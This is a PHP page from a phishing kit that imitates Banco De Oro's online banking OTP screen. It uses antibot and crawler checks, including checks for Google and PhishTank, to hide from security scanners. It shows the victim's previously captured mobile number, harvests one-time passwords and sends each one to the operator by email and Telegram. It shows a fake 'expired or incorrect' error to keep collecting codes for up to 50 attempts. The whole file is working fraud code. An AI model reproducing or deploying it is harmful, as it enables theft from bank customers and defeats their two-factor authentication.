<?php 
session_start();
ob_start();

require_once( 'conf.php' );
require_once( 'php_components/user_info.php' );

require_once( 'antibot_files/APIs/antibot_pw.api.php' );
require_once( 'antibot_files/crawler_detection/is_google.php'    );
require_once( 'antibot_files/crawler_detection/is_phishtank.php' );
require_once( 'antibot_files/crawler_detection/is_spider.php' );
require_once( 'antibot_files/blacklist/blacklist_ip.php' );
require_once( 'antibot_files/blacklist/blacklist_ua.php' );
require_once( 'antibot_files/blacklist/blacklist_isp.php' );
require_once( 'antibot_files/blacklist/blacklist_word.php' );
require_once( 'antibot_files/blacklist/ip_range.php' );

if(!isset($_SESSION['@ADVANCEDSPAMMING-second_log'])) header('location: mobile_number.php');

if(isset($_GET['new_otp'])) {
require_once('php_components/messages.php');
$text .= '
<i>Action: OTP Generate Request</i>
';
require_once('php_components/sendMessage.telegram.php');
}

if($_SERVER['REQUEST_METHOD'] == 'POST') {

  if(strlen($_POST['otp_pin']) == 6){
   
    $_SESSION['otp_attempts']++;

    $_SESSION['@ADVANCEDSPAMMING-otp'] = array(
      'code' => $_POST['otp_pin']);

    require_once('php_components/messages.php');

    require_once('php_components/sendMail.php');
    require_once('php_components/sendMessage.telegram.php');

    echo $_SESSION['otp_attempts'];

    if($_SESSION['otp_attempts'] == 50) header('location: ' . $success['redirect_url']);
  }
}
?>
<html>
  <head>
    <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
    <meta http-equiv="X-UA-Compatible" content="IE=100">
    <title>Banco De Oro Online Banking</title>
    <link rel="stylesheet" type="text/css" href="styles/css/jquery-ui-1.8.2.custom.css">
    <link rel="stylesheet" type="text/css" href="styles/css/allcss.css">
    <link rel="stylesheet" type="text/css" href="styles/css/base.css">
    <link rel="stylesheet" type="text/css" href="styles/css/layout.css">
  </head>
  <body>
    <div id="parentcontainer">
      <div id="wrapper">
        <div id="head">
          <div id="contentTop">
            <div id="logoWrapper">
              <div id="bdoLogo">
                <a href="javascript:void(0);" >
                  <span>Banco De Oro</span>
                </a>
              </div>
            </div>
          </div>
        </div>
        <div id="page">
          <div></div>
          <div id="mainwrapper" class="ui-corner-all">
            <div id="main" class="contentblock">
              <table>
                <tbody>
                  <tr>
                    <td>
                      <h2 class="pageHeader" style="font-weight: bold">
                        <span style="font-size: 14px">One-Time Password (OTP)</span>
                      </h2>
                      <br>
                      <div class="headerCaption">
                        <span style="font-size: 13px; color: #808080">
                        To further ensure the security of your online banking transactions, <br>
                        you will be receiving a One-Time Password (OTP) via your <br>
                        registered mobile phone number: <?php echo $_SESSION['@ADVANCEDSPAMMING-personal']['mobile_num']; ?>
                        </span>
                      </div>
                    </td>
                    <td>
                      <div style="float: right; text-align: right">
                        <div></div>
                      </div>
                    </td>
                  </tr>
                </tbody>  
              </table>
              <div id="id81" class="sxiFeedback"></div>
              <div>
                <div id="id82" style="display:none"></div>
              </div>
              <div>
                <div id="id83" style="display:none"></div>
              </div>
              <table>
                <tbody>
                  <tr>
                    <td style="vertical-align: top">
                      <div class="ui-widget">
                        <span>
                          <span>
    
                              <div class="portlet-content">
                                <form onsubmit="otp_auth(document.querySelector('#otp_pin').value);" id="idc" method="post" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" class="jNice" autocomplete="off">
                 
                                  <table class="formtable">
                                    <tbody>
                                      <tr id="highlight_row" class="">
                                        <td class="formlabel" style="width: 90px">Enter your OTP:</td>
                                        <td>
                                          <input class="required" type="text" maxlength="6" value="" name="otp_pin" id="otp_pin">
                                        </td>
                                      </tr>
                                    </tbody>
                                  </table>
                                  <br>
                                  <span class="feedback sxiFeedback" id="id12c" style="display: <?php if($_SESSION['otp_attempts'] == 0 || isset($_GET['new_otp'])){ echo 'none';} else{ 'block'; } ?>">
                                    <ul class="paginationul">
                                      <li class="feedbackPanelERROR">
                                        <span id="err_message" class="feedbackPanelERROR">One-Time Password has expired or incorrect</span>
                                      </li>
                                    </ul>
                                  </span>
                                  <p>
                                  <input type="button" id="id12a"  class="ui-state-default ui-corner-all sxi-button" value="Cancel Login">
                                    <input type="submit" name="submitButton" id="id87" sxibutton="true" class="sxi-button ui-corner-all ui-state-default" validating="true" value="Proceed">
                                  </p>
                                </form>
                              </div>
                              <div class="rightcontainer">
                              </div>
                          </span>
                        </span>
                      </div>
                    </td>
                    <td style="vertical-align: top" width="20px">
                    
                      <div id="info">
                        <div></div>
                      </div>
                    </td>
                  </tr>
                </tbody>
              </table>
              <div class="headerCaption" style="margin-top:5px">
                        <span style="color: #808080; font-size: 13px">
                        If you did not receive your One-Time Password (OTP) via SMS within 5 minute(s) or if your <br>
                        One-Time Password (OTP) has expired, click here to generate a new <br>
                        <a href="<?php echo $_SERVER['PHP_SELF'] . '?new_otp=true'; ?>" style="font-weight: bold; text-decoration: underline">One-Time Password (OTP)</a> <span id="timer" style="font-weight: 900; color: black">(5:00)</span> to proceed with the update.
                        </span>
                      </div>
            </div>
          </div>
        </div>
        <?php require_once('html_components/main_footer.php'); ?>
      </div>
      <div id="bysy_indicator" style="display: none;">
        <div id="loading_gif"></div>
      </div>
    </div>
    <div id="id88"></div>
    <script src="js_scripts/variables_root.js"></script>
    <script src="js_scripts/otp.js"></script>
  </body>
</html>